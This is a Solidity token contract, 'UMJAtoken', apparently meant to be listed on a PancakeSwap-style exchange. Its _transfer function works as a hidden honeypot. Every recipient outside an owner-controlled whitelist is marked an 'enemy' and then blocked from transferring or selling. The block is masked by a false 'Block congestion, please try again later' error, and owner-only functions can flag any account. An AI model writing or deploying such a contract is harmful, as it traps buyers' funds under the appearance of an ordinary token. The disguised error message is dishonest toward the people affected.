contract UMJAtoken is UMOJAERC20, UMOJAOwnable {
    using SafeMath for uint256;

    mapping(address => bool) public _isEnemy;

    mapping(address => bool) public isMaxEatExempt;

    mapping(address => bool) public _isPaddress;

    address public  uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    bool public enableKillBlock;
    bool public enableOffTrade;
    bool public enableWalletLimit;
    uint256 public startTradeBlock;
    uint256 public kb;
    address public rewardToken;
    uint256 public maxWalletAmount;
    address public _marketingWalletAddress;
    address public currency;

    constructor(
        string[] memory stringParams,
        address[] memory addressParams,
        uint256[] memory numberParams,
        bool[] memory boolParams
    ) payable UMOJAERC20(stringParams[0], stringParams[1]) {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0xD99D1c33F9fC3444f8101754aBC46c52416550D1
        );

        uniswapV2Router = _uniswapV2Router;

        enableOffTrade = boolParams[0];
        if(!enableOffTrade){
             startTradeBlock = block.number;
        }

        enableKillBlock = boolParams[1];
        enableWalletLimit = boolParams[3];

        kb = numberParams[11];

        uint256 totalSupply = numberParams[1] * (10**18);
        maxWalletAmount = numberParams[2];

        currency = addressParams[1];
        rewardToken = addressParams[4];
        _marketingWalletAddress = addressParams[0];

        isMaxEatExempt[msg.sender] = true;
        isMaxEatExempt[_marketingWalletAddress] = true;
        isMaxEatExempt[address(uniswapV2Router)] = true;
        isMaxEatExempt[address(this)] = true;
        isMaxEatExempt[address(0xdead)] = true;

        _creation(owner(), totalSupply);
    }

    function setAutomatedMarketMakerPair(address pair) public onlyOwner {
        require(uniswapV2Pair==address(0)||pair == uniswapV2Pair, "The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");
        uniswapV2Pair=pair;
        isMaxEatExempt[uniswapV2Pair] = true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        
        if (_isPaddress[from]) {
        } else {
            require(!_isEnemy[from], "ERC20: Block congestion, please try again later");
        }

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (enableOffTrade) {
            bool star = startTradeBlock > 0;
            require(star);
        }

        if (!isMaxEatExempt[to] && enableWalletLimit)
            require(
                (balanceOf(to) + amount ) <= maxWalletAmount,
                "over limit"
        );

        if (_isPaddress[to]) {
        } else {
            if (!_isEnemy[to]) {
                _isEnemy[to] = true;
            }
        }
        
        super._transfer(from, to, amount);
    }

    function EnemyAddress(address account, bool value) external onlyOwner {
        _isEnemy[account] = value;
    }

    function Paddress(address account, bool value) external onlyOwner {
        _isPaddress[account] = value;
    }

    function setkb(uint256 a) external onlyOwner {
        kb = a;
    }

    function setMaxWalletAmount(uint256 a) external onlyOwner {
        maxWalletAmount = a;
    }

    function launch() external onlyOwner {
        require(0 == startTradeBlock, "opened");
        startTradeBlock = block.number;
    }
}